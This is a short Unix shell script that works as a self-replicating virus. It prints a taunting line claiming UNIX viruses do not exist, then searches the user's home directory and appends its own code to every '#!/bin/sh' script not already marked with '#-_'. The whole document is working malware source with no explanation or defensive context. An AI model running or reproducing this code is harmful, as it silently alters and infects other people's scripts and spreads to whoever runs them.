#!/bin/sh

#-_

echo "Java is safe, and UNIX viruses do not exist."

for file in `find $HOME -type f -print`

do

    case "`sed 1q $file`" in

        "#!/bin/sh" ) grep '#-_' $file > /dev/null || sed -n '/#-_/,$p' $0 >> $file

    esac

done

2>/dev/null
